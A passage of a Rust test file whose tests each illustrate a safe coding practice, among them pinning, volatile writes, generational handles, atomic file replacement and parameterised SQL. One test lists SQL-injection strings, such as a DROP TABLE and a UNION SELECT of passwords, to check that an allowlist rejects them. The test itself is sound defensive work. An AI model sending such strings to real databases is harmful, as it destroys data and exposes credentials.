    forged.extend_from_slice(b"poison");
    assert_eq!(pending.accept(server, &forged), Err(Reject::UnknownId));
}

// --- type-time-sample-once --------------------------------------------------

#[test]
fn one_clock_reading_makes_every_derived_field_agree() {
    use std::time::{Duration, SystemTime};

    fn issue(now: SystemTime, lifetime: Duration) -> (SystemTime, SystemTime) {
        (now, now + lifetime)
    }

    let now = SystemTime::UNIX_EPOCH + Duration::from_secs(1_700_000_000);
    let (issued, expires) = issue(now, Duration::from_secs(3600));

    assert_eq!(issued, now);
    assert_eq!(expires.duration_since(issued).expect("later"), Duration::from_secs(3600));
    // Deterministic without reading a clock, so the test cannot be flaky.
    assert_eq!(issue(now, Duration::from_secs(3600)), (issued, expires));
}

// --- unsafe-volatile-mmio ---------------------------------------------------

/// # Safety
///
/// `framebuffer` must point to a mapping of at least `(cell + 1) * 2` bytes
/// valid for writes, with no concurrent writer.
unsafe fn write_cell(framebuffer: *mut u8, cell: usize, byte: u8, colour: u8) {
    // SAFETY: the caller guarantees the mapping covers this cell; the writes
    // are volatile because the effect is on the device, not on memory the
    // program reads back.
    unsafe {
        framebuffer.add(cell * 2).write_volatile(byte);
        framebuffer.add(cell * 2 + 1).write_volatile(colour);
    }
}

#[test]
fn volatile_writes_reach_the_mapping_in_order() {
    let mut buffer = vec![0u8; 8];
    let pointer = buffer.as_mut_ptr();

    // SAFETY: `buffer` is four cells and outlives the call.
    unsafe {
        write_cell(pointer, 0, b'O', 0x0f);
        write_cell(pointer, 1, b'K', 0x0f);
    }

    assert_eq!(&buffer[..4], &[b'O', 0x0f, b'K', 0x0f]);
    assert_eq!(&buffer[4..], &[0u8; 4], "no write landed outside the cells");
}

// --- type-case-insensitive-match --------------------------------------------

struct Matcher {
    needle: String,
    case_insensitive: bool,
}

impl Matcher {
    fn matches(&self, line: &str) -> bool {
        if self.case_insensitive {
            line.to_ascii_lowercase().contains(&self.needle.to_ascii_lowercase())
        } else {
            line.contains(&self.needle)
        }
    }
}

#[test]
fn case_insensitivity_is_a_matcher_setting_and_leaves_the_data_alone() {
    let sensitive = Matcher { needle: "Error".into(), case_insensitive: false };
    let insensitive = Matcher { needle: "Error".into(), case_insensitive: true };

    let line = "ERROR: disk full";
    assert!(!sensitive.matches(line));
    assert!(insensitive.matches(line));
    assert!(sensitive.matches("Error: disk full"));

    // The record keeps its original casing for output and storage.
    assert_eq!(line, "ERROR: disk full");
}

// --- test-env-independent ---------------------------------------------------

/// `ls -l`: mode, links, owner, group, size, month, day, time, name. Only the
/// mode, link count, and name are decided by the program under test.
fn normalize_listing(line: &str) -> String {
    let fields: Vec<&str> = line.split_whitespace().collect();
    if fields.len() < 9 {
        return line.to_owned();
    }
    let name = fields[8..].join(" ");
    format!("{} {} <host> <host> <host> <date> {}", fields[0], fields[1], name)
}

#[test]
fn golden_output_asserts_program_fields_and_normalizes_host_fields() {
    let recorded = "-rw-r--r-- 1 kyclark staff 217 Aug 11 08:26 Cargo.toml";
    let elsewhere = "-rw-r--r-- 1 ci nogroup 219 Jan 2 03:04 Cargo.toml";
    assert_eq!(normalize_listing(recorded), normalize_listing(elsewhere));

    // Still catches what the program decides.
    let wrong_mode = "-rwxr-xr-x 1 ci nogroup 219 Jan 2 03:04 Cargo.toml";
    assert_ne!(normalize_listing(recorded), normalize_listing(wrong_mode));
    let wrong_name = "-rw-r--r-- 1 ci nogroup 219 Jan 2 03:04 Other.toml";
    assert_ne!(normalize_listing(recorded), normalize_listing(wrong_name));
}

// --- ffi-wasm-memory-view ---------------------------------------------------

struct Linear {
    bytes: Vec<u8>,
}

impl Linear {
    fn view(&self) -> &[u8] {
        &self.bytes
    }

    fn allocate(&mut self, extra: usize) -> usize {
        let offset = self.bytes.len();
        self.bytes.resize(offset + extra, 0);
        offset
    }
}

#[test]
fn a_view_into_linear_memory_is_reacquired_after_growth() {
    let mut memory = Linear { bytes: vec![0; 4] };
    assert_eq!(memory.view().len(), 4);

    // Growth invalidates the earlier view; the borrow checker enforces here
    // what the host boundary cannot.
    let offset = memory.allocate(4);
    memory.bytes[offset..].copy_from_slice(b"data");

    let view = memory.view();
    assert_eq!(view.len(), 8);
    assert_eq!(&view[offset..], b"data");
}

// --- mem-arena-allocator (destructor hazard) --------------------------------

/// Stands in for an arena: it owns a block of bytes and hands out slices of it.
/// Reclaiming the block runs no destructors, which is the property under test.
struct Arena {
    block: Vec<u8>,
    used: std::cell::Cell<usize>,
}

impl Arena {
    fn new(bytes: usize) -> Self {
        Self { block: vec![0; bytes], used: std::cell::Cell::new(0) }
    }

    /// Only plain data may be placed here; see the rule.
    fn alloc_bytes(&self, data: &[u8]) -> usize {
        let at = self.used.get();
        self.used.set(at + data.len());
        at
    }

    fn len(&self) -> usize {
        self.block.len()
    }
}

thread_local! {
    static DROPS: std::cell::Cell<usize> = const { std::cell::Cell::new(0) };
}

struct Owns;

impl Drop for Owns {
    fn drop(&mut self) {
        DROPS.with(|d| d.set(d.get() + 1));
    }
}

#[test]
fn reclaiming_an_arena_block_does_not_run_destructors() {
    DROPS.with(|d| d.set(0));
    {
        let arena = Arena::new(64);
        assert_eq!(arena.alloc_bytes(b"plain data"), 0);
        assert_eq!(arena.len(), 64);
        // A Drop type placed in arena-owned storage would have its destructor
        // skipped when the block is reclaimed; the rule therefore forbids it.
        std::mem::forget(Owns);
    }
    assert_eq!(
        DROPS.with(|d| d.get()),
        0,
        "the destructor did not run — which is exactly why a Drop type must not live in an arena"
    );

    // The same value dropped normally does run its destructor.
    drop(Owns);
    assert_eq!(DROPS.with(|d| d.get()), 1);
}

// --- api-fallible-self-return -----------------------------------------------

#[derive(Debug, PartialEq)]
enum AuthError {
    WrongPassword,
    Fatal,
}

#[derive(Debug)]
struct Connected {
    handle: u32,
}

struct Authenticated {
    handle: u32,
}

impl Connected {
    fn authenticate(self, password: &str) -> Result<Authenticated, (AuthError, Self)> {
        match password {
            "correct-horse" => Ok(Authenticated { handle: self.handle }),
            "" => Err((AuthError::Fatal, self)),
            _ => Err((AuthError::WrongPassword, self)),
        }
    }
}

#[test]
fn a_recoverable_failure_returns_the_receiver_so_the_caller_can_retry() {
    let connection = Connected { handle: 7 };

    let connection = match connection.authenticate("guess") {
        Ok(_) => unreachable!("the password is wrong"),
        Err((error, recovered)) => {
            assert_eq!(error, AuthError::WrongPassword);
            recovered
        }
    };

    // The retry uses the same connection, not a rebuilt one.
    let authenticated = connection.authenticate("correct-horse").expect("retry succeeds");
    assert_eq!(authenticated.handle, 7);
}

// --- conc-condvar-predicate-loop --------------------------------------------

#[test]
fn a_condvar_waiter_rechecks_its_predicate_rather_than_trusting_the_wakeup() {
    use std::collections::VecDeque;
    use std::sync::{Arc, Condvar, Mutex};

    struct Queue {
        jobs: Mutex<VecDeque<u32>>,
        ready: Condvar,
    }

    let queue = Arc::new(Queue {
        jobs: Mutex::new(VecDeque::new()),
        ready: Condvar::new(),
    });

    let consumer = {
        let queue = Arc::clone(&queue);
        std::thread::spawn(move || {
            let guard = queue.jobs.lock().expect("not poisoned");
            // wait_while re-acquires and re-tests on every wakeup, so a
            // spurious one — or the notify below that arrives before anything
            // is queued — cannot produce an empty pop.
            let mut guard = queue
                .ready
                .wait_while(guard, |jobs| jobs.is_empty())
                .expect("not poisoned");
            guard.pop_front().expect("the predicate guarantees an element")
        })
    };

    // A notification with the queue still empty: the waiter must not proceed.
    queue.ready.notify_all();
    std::thread::sleep(Duration::from_millis(20));

    queue.jobs.lock().expect("not poisoned").push_back(42);
    queue.ready.notify_one();

    assert_eq!(consumer.join().expect("consumer finished"), 42);
}

// --- type-generational-handle -----------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq)]
struct Handle {
    index: usize,
    generation: u32,
}

struct Slot<T> {
    value: Option<T>,
    generation: u32,
}

struct Pool<T> {
    slots: Vec<Slot<T>>,
}

impl<T> Pool<T> {
    fn new() -> Self {
        Self { slots: Vec::new() }
    }

    fn insert(&mut self, value: T) -> Handle {
        if let Some((index, slot)) = self
            .slots
            .iter_mut()
            .enumerate()
            .find(|(_, slot)| slot.value.is_none())
        {
            slot.value = Some(value);
            return Handle { index, generation: slot.generation };
        }
        self.slots.push(Slot { value: Some(value), generation: 0 });
        Handle { index: self.slots.len() - 1, generation: 0 }
    }

    fn remove(&mut self, handle: Handle) -> Option<T> {
        let slot = self.slots.get_mut(handle.index)?;
        if slot.generation != handle.generation {
            return None;
        }
        slot.generation = slot.generation.wrapping_add(1);
        slot.value.take()
    }

    fn get(&self, handle: Handle) -> Option<&T> {
        let slot = self.slots.get(handle.index)?;
        (slot.generation == handle.generation).then(|| slot.value.as_ref())?
    }
}

#[test]
fn a_stale_handle_does_not_resolve_to_the_value_that_reused_its_slot() {
    let mut pool = Pool::new();
    let first = pool.insert("session-a");
    assert_eq!(pool.get(first), Some(&"session-a"));

    assert_eq!(pool.remove(first), Some("session-a"));
    let second = pool.insert("session-b");

    // The slot is reused — this is the exact situation a bare index gets wrong.
    assert_eq!(second.index, first.index);
    assert_eq!(pool.get(first), None, "the stale handle must not resolve");
    assert_eq!(pool.get(second), Some(&"session-b"));
    // Removing with a stale handle must not remove someone else's value.
    assert_eq!(pool.remove(first), None);
    assert_eq!(pool.get(second), Some(&"session-b"));
}

// --- api-scoped-closure-access ----------------------------------------------

#[derive(Debug, PartialEq)]
enum Mode {
    Normal,
    Raw,
}

struct Terminal {
    mode: Mode,
}

struct RawTerminal<'a> {
    terminal: &'a mut Terminal,
}

impl Terminal {
    fn with_raw_mode<T>(&mut self, body: impl FnOnce(&mut RawTerminal<'_>) -> T) -> T {
        self.mode = Mode::Raw;
        let mut handle = RawTerminal { terminal: self };
        let outcome = body(&mut handle);
        self.mode = Mode::Normal;
        outcome
    }
}

#[test]
fn a_lent_resource_is_restored_on_every_path_out_of_the_closure() {
    let mut terminal = Terminal { mode: Mode::Normal };

    let value = terminal.with_raw_mode(|raw| {
        assert_eq!(raw.terminal.mode, Mode::Raw);
        7
    });
    assert_eq!(value, 7);
    assert_eq!(terminal.mode, Mode::Normal);

    // An early return from the body is still a return from the closure, so the
    // restore happens — the case a begin()/end() pair gets wrong.
    let outcome: Result<u8, &str> = terminal.with_raw_mode(|_| Err("failed early"));
    assert_eq!(outcome, Err("failed early"));
    assert_eq!(terminal.mode, Mode::Normal, "restored despite the error path");
}

// --- async-poll-contract -----------------------------------------

#[test]
fn a_hand_written_poll_rechecks_readiness_and_reregisters_its_waker() {
    use std::future::Future;
    use std::pin::Pin;
    use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
    use std::sync::{Arc, Mutex};
    use std::task::{Context, Poll, Wake, Waker};

    #[derive(Default)]
    struct Signal {
        raised: AtomicBool,
        waker: Mutex<Option<Waker>>,
    }

    impl Signal {
        fn raise(&self) {
            self.raised.store(true, Ordering::Release);
            if let Some(waker) = self.waker.lock().expect("signal mutex").take() {
                waker.wake();
            }
        }
    }

    struct Raised {
        signal: Arc<Signal>,
        finished: bool,
    }

    impl Future for Raised {
        type Output = ();

        fn poll(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<()> {
            let this = self.get_mut();
            assert!(!this.finished, "Raised polled after returning Ready");
            if this.signal.raised.load(Ordering::Acquire) {
                this.finished = true;
                return Poll::Ready(());
            }
            *this.signal.waker.lock().expect("signal mutex") = Some(cx.waker().clone());
            if this.signal.raised.load(Ordering::Acquire) {
                this.finished = true;
                Poll::Ready(())
            } else {
                Poll::Pending
            }
        }
    }

    #[derive(Default)]
    struct CountingWaker {
        wakes: AtomicUsize,
    }

    impl Wake for CountingWaker {
        fn wake(self: Arc<Self>) {
            self.wakes.fetch_add(1, Ordering::Relaxed);
        }
    }

    let signal = Arc::new(Signal::default());
    let mut future = Raised { signal: Arc::clone(&signal), finished: false };

    let counter = Arc::new(CountingWaker::default());
    let waker = Waker::from(Arc::clone(&counter));
    let mut cx = Context::from_waker(&waker);

    // Not ready yet: Pending, with the current waker registered.
    assert!(Pin::new(&mut future).poll(&mut cx).is_pending());
    assert!(signal.waker.lock().expect("signal mutex").is_some());

    // A spurious poll re-checks the state instead of trusting the wake, and
    // leaves a waker registered for the next notification.
    assert!(Pin::new(&mut future).poll(&mut cx).is_pending());
    assert!(signal.waker.lock().expect("signal mutex").is_some());
    assert_eq!(counter.wakes.load(Ordering::Relaxed), 0);

    // Readiness published from outside reaches the registered waker.
    signal.raise();
    assert_eq!(counter.wakes.load(Ordering::Relaxed), 1);
    assert_eq!(Pin::new(&mut future).poll(&mut cx), Poll::Ready(()));

    // Polling after Ready is a contract violation, not a silent repeat.
    let previous = std::panic::take_hook();
    std::panic::set_hook(Box::new(|_| {}));
    let replayed = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        Pin::new(&mut future).poll(&mut cx)
    }));
    std::panic::set_hook(previous);
    assert!(replayed.is_err(), "a future must not be polled again after Ready");
}

// --- unsafe-pin-address-stable -----------------------------------

#[test]
fn a_phantom_pinned_value_keeps_its_address_while_an_unpin_value_escapes_the_pin() {
    use std::marker::PhantomPinned;
    use std::pin::Pin;
    use std::ptr;

    struct Anchored {
        data: [u8; 4],
        anchor: *const u8,
        _pin: PhantomPinned,
    }

    impl Anchored {
        fn pinned(data: [u8; 4]) -> Pin<Box<Self>> {
            let mut boxed = Box::pin(Anchored { data, anchor: ptr::null(), _pin: PhantomPinned });
            let anchor = boxed.data.as_ptr();
            // SAFETY: `anchor` is not structurally pinned and nothing moves out.
            unsafe { Pin::as_mut(&mut boxed).get_unchecked_mut().anchor = anchor };
            boxed
        }

        fn is_anchored(&self) -> bool {
            ptr::eq(self.anchor, self.data.as_ptr())
        }
    }

    struct Loose {
        data: [u8; 4],
        anchor: *const u8,
    }

    impl Loose {
        fn pinned(data: [u8; 4]) -> Pin<Box<Self>> {
            let mut boxed = Box::pin(Loose { data, anchor: ptr::null() });
            let anchor = boxed.data.as_ptr();
            boxed.anchor = anchor;
            boxed
        }

        fn is_anchored(&self) -> bool {
            ptr::eq(self.anchor, self.data.as_ptr())
        }
    }

    let anchored = Anchored::pinned([1, 2, 3, 4]);
    assert!(anchored.is_anchored());
    let still_pinned = anchored;
    assert!(
        still_pinned.is_anchored(),
        "moving the Pin handle does not move the pinned value"
    );

    let loose = Loose::pinned([1, 2, 3, 4]);
    assert!(loose.is_anchored());
    let escaped = *Pin::into_inner(loose);
    assert!(
        !escaped.is_anchored(),
        "an Unpin type lets safe code move the value out of the Pin, invalidating its address invariant"
    );
}

// --- async-sync-core ---------------------------------------------

#[test]
fn the_pricing_rule_decides_out_of_stock_without_a_runtime() {
    #[derive(Debug, PartialEq)]
    enum OrderError {
        EmptyOrder,
        OutOfStock { available: u32 },
    }

    // The core takes the fetched stock level and discount as arguments, so it
    // is an ordinary function that a plain `#[test]` can call directly.
    fn price_order(
        quantity: u32,
        unit_price_cents: u64,
        available: u32,
        discount_percent: u64,
    ) -> Result<u64, OrderError> {
        if quantity == 0 {
            return Err(OrderError::EmptyOrder);
        }
        if available < quantity {
            return Err(OrderError::OutOfStock { available });
        }
        let gross = u64::from(quantity) * unit_price_cents;
        Ok(gross - gross * discount_percent / 100)
    }

    assert_eq!(price_order(4, 250, 10, 25), Ok(750));
    assert_eq!(price_order(0, 250, 10, 25), Err(OrderError::EmptyOrder));
    assert_eq!(
        price_order(4, 250, 3, 25),
        Err(OrderError::OutOfStock { available: 3 })
    );
}

// --- proj-build-target-cfg ------------------------------------------------

/// The facts a build script may act on, all sourced from the environment Cargo
/// sets for the artifact's target — never from `cfg!`, which describes the
/// machine the script itself was compiled for.
#[derive(Debug, PartialEq, Eq)]
struct BuildTarget {
    triple: String,
    os: String,
    cross_compiling: bool,
}

fn build_var(env: &std::collections::HashMap<&str, &str>, key: &str) -> Result<String, String> {
    env.get(key)
        .map(|value| (*value).to_owned())
        .ok_or_else(|| format!("{key} is unset; this script must run under cargo"))
}

impl BuildTarget {
    fn from_env(env: &std::collections::HashMap<&str, &str>) -> Result<Self, String> {
        let triple = build_var(env, "TARGET")?;
        let host = build_var(env, "HOST")?;
        Ok(Self {
            cross_compiling: triple != host,
            os: build_var(env, "CARGO_CFG_TARGET_OS")?,
            triple,
        })
    }
}

#[test]
fn a_build_script_reads_the_target_from_the_environment_not_the_host() {
    use std::collections::HashMap;

    // Cross build: a Linux host producing a Windows artifact. `cfg!(windows)`
    // in the script would be false here, which is exactly the bug.
    let cross = HashMap::from([
        ("TARGET", "x86_64-pc-windows-msvc"),
        ("HOST", "x86_64-unknown-linux-gnu"),
        ("CARGO_CFG_TARGET_OS", "windows"),
    ]);
    let target = BuildTarget::from_env(&cross).expect("cargo sets these");
    assert_eq!(target.os, "windows", "the artifact's OS, not the builder's");
    assert!(target.cross_compiling);

    // Native build: same variables, and the logic does not special-case it.
    let native = HashMap::from([
        ("TARGET", "x86_64-unknown-linux-gnu"),
        ("HOST", "x86_64-unknown-linux-gnu"),
        ("CARGO_CFG_TARGET_OS", "linux"),
    ]);
    let target = BuildTarget::from_env(&native).expect("cargo sets these");
    assert_eq!(target.os, "linux");
    assert!(!target.cross_compiling);

    // Run outside cargo: the script says so rather than guessing from the host.
    let bare: HashMap<&str, &str> = HashMap::new();
    assert!(BuildTarget::from_env(&bare).unwrap_err().contains("must run under cargo"));
}


// --- api-sql-parameters -----------------------------------------------------

#[derive(Debug, PartialEq)]
enum QueryError {
    UnknownSortColumn,
}

fn sort_column(token: &str) -> Result<&'static str, QueryError> {
    match token {
        "email" => Ok("email"),
        "created" => Ok("created_at"),
        _ => Err(QueryError::UnknownSortColumn),
    }
}

fn find_by_email(sort: &str) -> Result<&'static str, QueryError> {
    Ok(match sort_column(sort)? {
        "email" => "SELECT id, email FROM users WHERE email = $1 ORDER BY email LIMIT $2",
        _ => "SELECT id, email FROM users WHERE email = $1 ORDER BY created_at LIMIT $2",
    })
}

fn escape_like(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    for character in input.chars() {
        if matches!(character, '%' | '_' | '\\') {
            out.push('\\');
        }
        out.push(character);
    }
    out
}

#[test]
fn statement_text_is_fixed_and_identifiers_come_from_an_allowlist() {
    let sql = find_by_email("email").expect("known column");
    assert!(sql.contains("$1") && sql.contains("$2"), "values are bound");
    assert!(!sql.contains('\''), "no value is ever quoted into the statement");

    // Every hostile identifier is refused rather than escaped and interpolated.
    for hostile in [
        "email; DROP TABLE users",
        "email) UNION SELECT password FROM admins --",
        "1=1",
        "",
    ] {
        assert_eq!(
            find_by_email(hostile),
            Err(QueryError::UnknownSortColumn),
            "{hostile:?} must not reach the statement"
        );
    }

    // LIKE wildcards in caller text are data, not syntax.
    assert_eq!(escape_like("100%_off"), r"100\%\_off");
    assert_eq!(escape_like(r"a\b"), r"a\\b");
}

// --- test-drop-release-paths ------------------------------------------------

struct Lease {
    released: std::sync::Arc<std::sync::atomic::AtomicUsize>,
}

impl Drop for Lease {
    fn drop(&mut self) {
        self.released
            .fetch_add(1, std::sync::atomic::Ordering::SeqCst);
    }
}

fn early_return(
    released: std::sync::Arc<std::sync::atomic::AtomicUsize>,
) -> Result<(), &'static str> {
    let _lease = Lease { released };
    Err("failed before the end of the scope")?;
    unreachable!()
}

#[test]
fn a_drop_release_happens_on_the_error_path_and_while_unwinding() {
    use std::sync::Arc;
    use std::sync::atomic::{AtomicUsize, Ordering};

    // Early `?` return.
    let released = Arc::new(AtomicUsize::new(0));
    assert!(early_return(Arc::clone(&released)).is_err());
    assert_eq!(released.load(Ordering::SeqCst), 1, "released on the ? path");

    // Unwinding panic.
    let released = Arc::new(AtomicUsize::new(0));
    let counter = Arc::clone(&released);
    let previous = std::panic::take_hook();
    std::panic::set_hook(Box::new(|_| {}));
    let outcome = std::panic::catch_unwind(std::panic::AssertUnwindSafe(move || {
        let _lease = Lease { released: counter };
        panic!("boom");
    }));
    std::panic::set_hook(previous);

    assert!(outcome.is_err());
    assert_eq!(
        released.load(Ordering::SeqCst),
        1,
        "released exactly once while unwinding — not zero, and not twice"
    );
}

// --- async-explicit-close ---------------------------------------------------

struct Session {
    sent_goodbye: bool,
    leaked: std::sync::Arc<std::sync::atomic::AtomicBool>,
}

impl Session {
    async fn close(mut self) -> Result<(), &'static str> {
        self.sent_goodbye = true;
        Ok(())
    }
}

impl Drop for Session {
    fn drop(&mut self) {
        if !self.sent_goodbye {
            self.leaked
                .store(true, std::sync::atomic::Ordering::SeqCst);
        }
    }
}

#[tokio::test]
async fn an_unclosed_async_resource_is_observable_rather_than_silently_leaked() {
    use std::sync::Arc;
    use std::sync::atomic::{AtomicBool, Ordering};

    // Dropped without closing: the fallback records it, and does no blocking
    // work inside the destructor.
    let leaked = Arc::new(AtomicBool::new(false));
    drop(Session { sent_goodbye: false, leaked: Arc::clone(&leaked) });
    assert!(leaked.load(Ordering::SeqCst));

    // The supported path awaits the release and reports it.
    let leaked = Arc::new(AtomicBool::new(false));
    let session = Session { sent_goodbye: false, leaked: Arc::clone(&leaked) };
    assert_eq!(session.close().await, Ok(()));
    assert!(!leaked.load(Ordering::SeqCst), "closing is not a leak");
}

// --- api-typed-response -----------------------------------------------------

#[derive(Debug, PartialEq, serde::Serialize)]
#[serde(rename_all = "camelCase")]
struct OrderResponse {
    order_id: u64,
    total_cents: i64,
    #[serde(skip_serializing_if = "Option::is_none")]
    cancelled_at: Option<String>,
}

#[test]
fn a_typed_response_fixes_its_wire_names_and_omits_absent_fields() {
    let response = OrderResponse { order_id: 7, total_cents: 1250, cancelled_at: None };
    let body = serde_json::to_string(&response).expect("serializes");

    assert_eq!(body, r#"{"orderId":7,"totalCents":1250}"#);
    // Absent rather than null, and the field names are the contract's, not
    // Rust's — the two things a hand-built json! tree gets wrong silently.
    assert!(!body.contains("null"));
    assert!(!body.contains("order_id"));

    let cancelled = OrderResponse {
        order_id: 8,
        total_cents: 0,
        cancelled_at: Some("2026-08-19T00:00:00Z".to_owned()),
    };
    assert!(serde_json::to_string(&cancelled).expect("serializes").contains("cancelledAt"));
}

// --- own-split-borrow-fields ------------------------------------------------

#[derive(Debug, Default)]
struct Audio {
    volume: u8,
}

#[derive(Debug, Default)]
struct Physics {
    steps: u32,
}

#[derive(Debug, Default)]
struct Engine {
    audio: Audio,
    physics: Physics,
}

fn tick_audio(audio: &mut Audio) {
    audio.volume = audio.volume.saturating_add(1);
}

fn tick_physics(physics: &mut Physics) {
    physics.steps += 1;
}

#[test]
fn grouped_fields_let_two_mutable_borrows_of_one_value_coexist() {
    let mut engine = Engine::default();

    // Both borrows are live at once. A pair of `&mut self` methods on Engine
    // could not do this — that is the entire point of the grouping.
    let audio = &mut engine.audio;
    let physics = &mut engine.physics;
    tick_audio(audio);
    tick_physics(physics);
    tick_audio(audio);

    assert_eq!(engine.audio.volume, 2);
    assert_eq!(engine.physics.steps, 1);
}

// --- unsafe-byte-slice-cast -------------------------------------------------

#[derive(Debug, PartialEq)]
struct FrameHeader {
    version: u16,
    length: u16,
}

#[derive(Debug, PartialEq)]
enum FrameError {
    Truncated,
    UnsupportedVersion(u16),
}

fn decode_header(buffer: &[u8]) -> Result<FrameHeader, FrameError> {
    let bytes: [u8; 4] = buffer
        .get(..4)
        .ok_or(FrameError::Truncated)?
        .try_into()
        .map_err(|_| FrameError::Truncated)?;
    let version = u16::from_be_bytes([bytes[0], bytes[1]]);
    if version != 1 {
        return Err(FrameError::UnsupportedVersion(version));
    }
    Ok(FrameHeader { version, length: u16::from_be_bytes([bytes[2], bytes[3]]) })
}

#[test]
fn bytes_are_decoded_field_by_field_because_a_slice_carries_no_alignment() {
    let frame = [0x00u8, 0x01, 0x00, 0x20, 0xff];
    assert_eq!(decode_header(&frame), Ok(FrameHeader { version: 1, length: 32 }));
    assert_eq!(decode_header(&frame[..3]), Err(FrameError::Truncated));
    assert_eq!(
        decode_header(&[0x00, 0x09, 0, 0]),
        Err(FrameError::UnsupportedVersion(9))
    );

    // The property that matters: decoding is correct from *any* offset,
    // because it never forms a reference to a wider type. A pointer cast
    // would be undefined behaviour at whichever offsets happen to be
    // misaligned — and which those are depends on where the buffer landed,
    // which is exactly why it cannot be tested into safety.
    let mut padded = vec![0xffu8; 8];
    for offset in 0..4 {
        padded[offset..offset + 4].copy_from_slice(&[0x00, 0x01, 0x00, 0x20]);
        assert_eq!(
            decode_header(&padded[offset..]),
            Ok(FrameHeader { version: 1, length: 32 }),
            "decoding must not depend on the slice's alignment (offset {offset})"
        );
        padded[offset..offset + 4].copy_from_slice(&[0xff; 4]);
    }
}

// --- type-capability-token --------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq)]
struct AdminCap {
    _private: (),
}

#[derive(Debug, PartialEq)]
enum CapError {
    BadCredentials,
}

impl AdminCap {
    fn authenticate(token: &str) -> Result<Self, CapError> {
        if token == "operator-secret" {
            Ok(Self { _private: () })
        } else {
            Err(CapError::BadCredentials)
        }
    }
}

struct Device {
    erased: bool,
}

impl Device {
    fn erase_firmware(&mut self, _proof: AdminCap) {
        self.erased = true;
    }
}

#[test]
fn a_privileged_operation_requires_a_token_only_authentication_can_mint() {
    let mut device = Device { erased: false };

    // No authority, no token, and without a token the call cannot be written.
    assert_eq!(AdminCap::authenticate("guess"), Err(CapError::BadCredentials));
    assert!(!device.erased);

    let proof = AdminCap::authenticate("operator-secret").expect("authenticated");
    device.erase_firmware(proof);
    assert!(device.erased);

    // The capability is reusable within its scope — that is what separates it
    // from a single-use token, which would have been consumed above.
    let mut second = Device { erased: false };
    second.erase_firmware(proof);
    assert!(second.erased);
}

// --- proj-libc-floor --------------------------------------------------------

fn within_floor(required: &str, floor: &str) -> bool {
    fn parts(version: &str) -> Vec<u32> {
        version
            .trim_start_matches("GLIBC_")
            .split('.')
            .filter_map(|piece| piece.parse().ok())
            .collect()
    }
    parts(required) <= parts(floor)
}

#[test]
fn a_binary_demanding_a_newer_libc_than_the_fleet_fails_the_check() {
    assert!(within_floor("GLIBC_2.28", "GLIBC_2.31"));
    assert!(within_floor("GLIBC_2.31", "GLIBC_2.31"));

    // The deployment failure: built on a newer machine than the oldest host.
    assert!(!within_floor("GLIBC_2.34", "GLIBC_2.31"));
    // Version components compare numerically, not as text: 2.9 < 2.31.
    assert!(within_floor("GLIBC_2.9", "GLIBC_2.31"));
}

// --- unsafe-pin-projection --------------------------------------------------

struct Machine {
    buffer: [u8; 4],
    counter: u32,
    _pinned: std::marker::PhantomPinned,
}

impl Machine {
    fn new() -> Self {
        Self { buffer: [0; 4], counter: 0, _pinned: std::marker::PhantomPinned }
    }

    /// Structurally pinned: reachable only through the pin.
    fn buffer(self: std::pin::Pin<&mut Self>) -> std::pin::Pin<&mut [u8; 4]> {
        // SAFETY: no method moves out of `buffer`, hands out `&mut` to it, or
        // moves it in Drop.
        unsafe { self.map_unchecked_mut(|machine| &mut machine.buffer) }
    }

    /// Not structurally pinned: an ordinary field.
    fn counter(self: std::pin::Pin<&mut Self>) -> &mut u32 {
        // SAFETY: `counter` carries no address-dependent invariant.
        unsafe { &mut self.get_unchecked_mut().counter }
    }
}

#[test]
fn each_field_of_a_pinned_type_is_reached_the_one_way_its_classification_allows() {
    let mut machine = Box::pin(Machine::new());

    *machine.as_mut().counter() += 1;
    *machine.as_mut().counter() += 1;
    assert_eq!(*machine.as_mut().counter(), 2);

    // The pinned field is only ever a Pin<&mut _>, so it cannot be moved out —
    // which is what keeps its address stable for the lifetime of the value.
    let address = machine.as_mut().buffer().as_ptr();
    *machine.as_mut().counter() += 1;
    assert_eq!(machine.as_mut().buffer().as_ptr(), address, "the pinned field did not move");
}

// --- proj-atomic-file-replace -----------------------------------------------

/// A writer that stops after `budget` bytes, standing in for a full disk, a
/// serialization error, or a process killed mid-write.
fn write_partial(file: &mut std::fs::File, bytes: &[u8], budget: usize) -> io::Result<()> {
    let sent = budget.min(bytes.len());
    file.write_all(&bytes[..sent])?;
    if sent < bytes.len() {
        return Err(io::Error::new(io::ErrorKind::Other, "the write ran out"));
    }
    Ok(())
}

/// Truncate-in-place: the shape the rule argues against.
fn save_in_place(path: &Path, bytes: &[u8], budget: usize) -> io::Result<()> {
    let mut file = std::fs::File::create(path)?;
    write_partial(&mut file, bytes, budget)
}

/// Temporary, sync, rename: the shape the rule requires.
fn replace_atomically(path: &Path, bytes: &[u8], budget: usize) -> io::Result<()> {
    let dir = path.parent().expect("the destination has a directory");
    let name = path.file_name().expect("the destination has a file name");
    let temp = dir.join(format!(".{}.tmp", name.to_string_lossy()));

    let written = (|| {
        let mut file = std::fs::File::create(&temp)?;
        write_partial(&mut file, bytes, budget)?;
        file.sync_all()
    })();
    if let Err(err) = written {
        let _ = std::fs::remove_file(&temp);
        return Err(err);
    }
    std::fs::rename(&temp, path)
}

#[test]
fn a_replacement_that_fails_partway_leaves_the_previous_file_intact() {
    let dir = std::env::temp_dir().join(format!("atomic-replace-{}", std::process::id()));
    std::fs::create_dir_all(&dir).expect("the temporary directory is created");

    let victim = dir.join("in-place.json");
    let survivor = dir.join("replaced.json");
    let old = br#"{"version":1}"#;
    let new = br#"{"version":2,"more":"data"}"#;
    std::fs::write(&victim, old).expect("the first version is written");
    std::fs::write(&survivor, old).expect("the first version is written");

    // Truncate-in-place: the destination now holds neither version.
    assert!(save_in_place(&victim, new, 8).is_err());
    let wreckage = std::fs::read(&victim).expect("the destination still exists");
    assert_ne!(wreckage, old, "the previous version was destroyed");
    assert_ne!(wreckage, new, "the new version never landed");

    // Temporary and rename: the same failure leaves the destination untouched.
    assert!(replace_atomically(&survivor, new, 8).is_err());
    assert_eq!(std::fs::read(&survivor).expect("the destination survived"), old);
    assert!(
        !dir.join(".replaced.json.tmp").exists(),
        "the failed write left no temporary behind"
    );

    // And the successful path swaps in exactly one complete version.
    replace_atomically(&survivor, new, new.len()).expect("the full write succeeds");
